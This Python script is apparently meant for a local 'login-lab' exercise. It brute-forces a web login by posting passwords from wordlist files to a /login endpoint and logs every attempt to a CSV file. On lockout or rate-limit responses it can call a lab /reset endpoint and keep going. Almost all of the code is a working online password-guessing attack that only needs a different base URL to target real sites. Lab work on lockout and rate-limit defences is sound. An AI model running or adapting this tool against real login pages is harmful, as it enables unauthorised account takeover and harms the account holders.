import argparse
import csv
import datetime
import pathlib
import time
from typing import Iterator

import requests


def iter_passwords(
    wordlists: list[pathlib.Path],
    max_passwords: int,
    skip_comment_lines: bool,
) -> Iterator[tuple[str, pathlib.Path]]:
    yielded = 0
    for wordlist in wordlists:
        with wordlist.open("r", encoding="utf-8", errors="ignore") as handle:
            for raw in handle:
                password = raw.strip()
                if not password:
                    continue
                if skip_comment_lines and password.startswith("#"):
                    continue
                yield password, wordlist
                yielded += 1
                if max_passwords > 0 and yielded >= max_passwords:
                    return


def discover_wordlists(explicit: list[pathlib.Path], generated_root: pathlib.Path, pattern: str) -> list[pathlib.Path]:
    if explicit:
        files: list[pathlib.Path] = []
        for entry in explicit:
            if entry.is_file():
                files.append(entry)
            elif entry.is_dir():
                files.extend(sorted(entry.rglob(pattern)))
        return files

    if generated_root.exists():
        return sorted(generated_root.rglob(pattern))

    return []


def build_default_log_path() -> pathlib.Path:
    stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return pathlib.Path("login-lab") / "logs" / f"attack_attempts_{stamp}.csv"


def run_attack(
    base_url: str,
    username: str,
    wordlists: list[pathlib.Path],
    delay: float,
    max_passwords: int,
    csv_log: pathlib.Path,
    auto_reset_on_block: bool,
    skip_comment_lines: bool,
) -> None:
    login_url = f"{base_url.rstrip('/')}/login"
    reset_url = f"{base_url.rstrip('/')}/reset"
    tries = 0

    csv_log.parent.mkdir(parents=True, exist_ok=True)
    with csv_log.open("w", encoding="utf-8", newline="") as csv_file:
        writer = csv.DictWriter(
            csv_file,
            fieldnames=[
                "timestamp_utc",
                "attempt",
                "username",
                "wordlist_file",
                "password",
                "status_code",
                "event_reason",
                "message",
            ],
        )
        writer.writeheader()

        for password, wordlist_file in iter_passwords(wordlists, max_passwords, skip_comment_lines):
            tries += 1
            response = requests.post(
                login_url,
                json={"username": username, "password": password},
                timeout=10,
            )

            try:
                payload = response.json()
            except ValueError:
                payload = {"message": response.text}

            event_reason = payload.get("reason", "success" if response.status_code == 200 else "unknown")
            message = payload.get("message", "")
            print(f"try={tries} password={password!r} status={response.status_code} payload={payload}")
            writer.writerow(
                {
                    "timestamp_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                    "attempt": tries,
                    "username": username,
                    "wordlist_file": str(wordlist_file),
                    "password": password,
                    "status_code": response.status_code,
                    "event_reason": event_reason,
                    "message": message,
                }
            )
            csv_file.flush()

            if response.status_code == 200:
                print("Password found.")
                print(f"CSV log written to: {csv_log}")
                return

            if response.status_code in (423, 429):
                print("Attack blocked by defenses.")
                if auto_reset_on_block:
                    reset_response = requests.post(reset_url, timeout=10)
                    if reset_response.ok:
                        print("Lab state reset after block. Continuing.")
                        if delay > 0:
                            time.sleep(delay)
                        continue
                    print("Failed to reset lab state after block. Stopping.")
                print(f"CSV log written to: {csv_log}")
                return

            if delay > 0:
                time.sleep(delay)

    print("Wordlist input exhausted.")
    print(f"CSV log written to: {csv_log}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Simple online password guessing demo")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--username", default="test_user")
    parser.add_argument(
        "--wordlist",
        action="append",
        type=pathlib.Path,
        help="File or directory (repeatable). If omitted, scans passwords/raw/**/*.txt",
    )
    parser.add_argument(
        "--generated-root",
        type=pathlib.Path,
        default=pathlib.Path("passwords/raw"),
        help="Root folder containing generated wordlists",
    )
    parser.add_argument("--pattern", default="*.txt", help="Glob for wordlist discovery")
    parser.add_argument("--max-passwords", type=int, default=0, help="0 means unlimited")
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument(
        "--auto-reset-on-block",
        action="store_true",
        help="Call POST /reset and continue when blocked by lockout/rate-limit",
    )
    parser.add_argument(
        "--keep-comment-lines",
        action="store_true",
        help="Do not skip wordlist lines beginning with #",
    )
    parser.add_argument(
        "--csv-log",
        type=pathlib.Path,
        default=build_default_log_path(),
        help="CSV output path for per-attempt logging",
    )
    args = parser.parse_args()

    explicit = args.wordlist or []
    wordlists = discover_wordlists(explicit, args.generated_root, args.pattern)
    if not wordlists:
        raise SystemExit("No wordlist files found. Provide --wordlist or populate passwords/raw.")

    print(f"Loaded {len(wordlists)} wordlist file(s).")
    run_attack(
        args.base_url,
        args.username,
        wordlists,
        args.delay,
        args.max_passwords,
        args.csv_log,
        args.auto_reset_on_block,
        not args.keep_comment_lines,
    )


if __name__ == "__main__":
    main()
